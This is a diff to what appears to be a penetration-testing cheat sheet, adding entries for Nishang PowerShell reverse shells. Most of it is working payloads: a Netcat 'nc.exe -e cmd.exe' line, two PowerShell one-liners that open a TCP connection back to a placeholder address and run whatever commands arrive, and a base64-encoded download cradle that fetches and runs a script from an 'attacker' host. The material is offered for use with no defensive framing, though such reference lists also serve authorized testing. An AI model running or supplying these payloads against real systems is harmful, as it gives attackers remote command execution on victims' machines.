@@ -73,7 +73,15 @@ Meterpreter Windows x64 Reverse TCP Staged
 Netcat
 `nc.exe -e cmd.exe ipaddress port`
 
-Nishang PowerShell Revshell
+Nishang Invoke-PowerShellTcpOneLine.ps1
+https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1
+```
+$client = New-Object System.Net.Sockets.TCPClient('ipaddress',port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+$sm=(New-Object Net.Sockets.TCPClient('ipaddress',port)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
+```
+
+Nishang Invoke-PowerShellTcp.ps1
 https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
 ```
 echo -n "IEX(new-object net.webclient).downloadstring('http://attacker/Invoke-PowerShellTcp.ps1')" | iconv -t UTF-16LE | base64 -w0 > payload.b64
